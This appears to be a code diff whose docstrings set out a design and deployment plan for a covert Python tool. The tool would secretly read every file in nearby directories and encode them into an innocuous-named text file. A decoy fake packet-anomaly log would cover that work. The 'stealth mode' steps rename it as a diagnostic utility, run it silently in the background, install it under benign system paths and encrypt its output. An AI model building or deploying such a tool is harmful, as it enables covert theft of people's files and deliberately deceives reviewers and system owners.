@@ -1,89 +1,73 @@
 '''
-🎭 Design Plan: Deceptive Dual-Purpose Encoder
+Design Plan: Deceptive Dual-Purpose Encoder
 
-✅ Part 1: The Hidden Payload (Real Functionality)
+Part 1: The Hidden Payload (Real Functionality)
 The original functionality:
 
 Traverse directories (up/down),
-
 Read all files,
-
 Encode bitstream using 2048-word dictionary,
-
 Write to policyReenforcement.txt.
 
-🪞 Part 2: The Cover Functionality (Decoy Output)
+Part 2: The Cover Functionality (Decoy Output)
 A complex, legitimate-looking function that:
 
 Consumes time and CPU.
-
 Writes a second file (e.g., sightings_log.txt) with detailed fake data — like simulated wildlife tracking, AI output, anomaly detection logs, etc.
-
 Includes randomized elements to vary each execution.
-
 Appears scientific or technical, but is meaningless.
 
 -----------------------------------------------------------------------
 
-✅ What This Does:
+What This Does:
 Obfuscates real intent — the casual reviewer sees only the "decoy" output and complex computation.
-
 Keeps hidden logic fully intact and separated in clean code.
-
 Real operation remains functional and recoverable by those who know where to look.
 
 -----------------------------------------------------------------------
 
-🛠️ Dual-Purpose Program Structure
-✅ Part 1 — Hidden Payload (Real Work)
+Dual-Purpose Program Structure
+Part 1 — Hidden Payload (Real Work)
 Same as before: traverse dirs, encode files into policyReenforcement.txt.
 
-🪞 Part 2 — Decoy Function (Visible Work)
+Part 2 — Decoy Function (Visible Work)
 Generates sightings_log.txt.
 
 Simulates packet logs with:
 
 IPs (randomized source/dest),
-
 Protocols (TCP/UDP/ICMP),
-
 Ports,
-
 Payload size,
-
 Timestamps,
-
 Anomaly score,
-
 Verdict (e.g., “normal”, “suspicious”, “drop”, “flagged”).
 
 Each line will look realistic to a casual analyst.
 
 -----------------------------------------------------------------------
 
-🧪 Example Fake Log Output:
+Example Fake Log Output:
 [2025-05-21 20:13:54] SRC:192.168.7.42 DST:10.0.0.5 PROTO:UDP SPORT:514 DPORT:8080 SIZE:512B ANOMALY:0.02 VERDICT:normal
 [2025-05-21 20:13:55] SRC:172.16.0.12 DST:10.0.0.9 PROTO:TCP SPORT:443 DPORT:22 SIZE:1040B ANOMALY:0.89 VERDICT:flagged
-
 '''
 '''
-
 Flag Names (in Sightings branch):
---m1Actual-only → Runs only the true file encoding logic (writes policyReenforcement.txt).
+-- m1Actual-only → Runs only the true file encoding logic (writes policyReenforcement.txt).
 
---m1Alternate-only → Runs only the decoy network anomaly generator (writes sightings_log.txt).
+-- m1Alternate-only → Runs only the decoy network anomaly generator (writes sightings_log.txt).
 
 With no flags, both parts run together.
 
-🧪 Example Usages:
+Example Usages:
 python sightings.py --m1Actual-only
 python sightings.py --m1Alternate-only
 python sightings.py                # runs both
 '''
 # ------------------NEW UPDATES-------------------------------------
 '''
-🕵️ Deployment Plan: Stealth Mode for Sightings
-✅ 1. Rename the Script
+Deployment Plan: Stealth Mode for Sightings
+1. Rename the Script
 
 Make it blend in:
 <mv sightings.py sysdiag_util.py>
@@ -94,37 +78,36 @@ Example names:
 - update_inspector.py
 '''
 '''
-
-✅ 2. Make it Executable
+2. Make it Executable
 Add a shebang and permissions:
 <#!/usr/bin/env python3>
 
 Then:
 <chmod +x sysdiag_util.py>
 
-✅ 3. Create .pyz Single-File Executable
+3. Create .pyz Single-File Executable
 Bundle into a compressed Python archive:
 <python3 -m zipapp sysdiag_util.py -o sysdiag_util.pyz -m "sysdiag_util:main">
 
 Launch with:
 <python3 sysdiag_util.pyz>
 
-✅ 4. Hide Execution in Background
+4. Hide Execution in Background
 Use nohup or & to run silently:
 <nohup python3 sysdiag_util.pyz --m1Actual-only > /dev/null 2>&1 &>
 
-✅ 5. Install with a Benign Path
+5. Install with a Benign Path
 Install in one of these:
 
 -- /usr/local/bin/diag
 -- ~/Library/Application Support/UpdateMonitor/
 -- C:\ProgramData\SystemLogs\
 
-✅ 6. Optional Enhancements
-- 🔒 Add XOR or AES encryption to policyReenforcement.txt
-- 🧬 Compress payload before word-mapping
-- 🔄 Rotate decoy wordlists/log styles
-- 🧩 Split output across multiple .log files
+6. Optional Enhancements
+- Add XOR or AES encryption to policyReenforcement.txt
+- Compress payload before word-mapping
+- Rotate decoy wordlists/log styles
+- Split output across multiple .log files
 '''
 
 import os
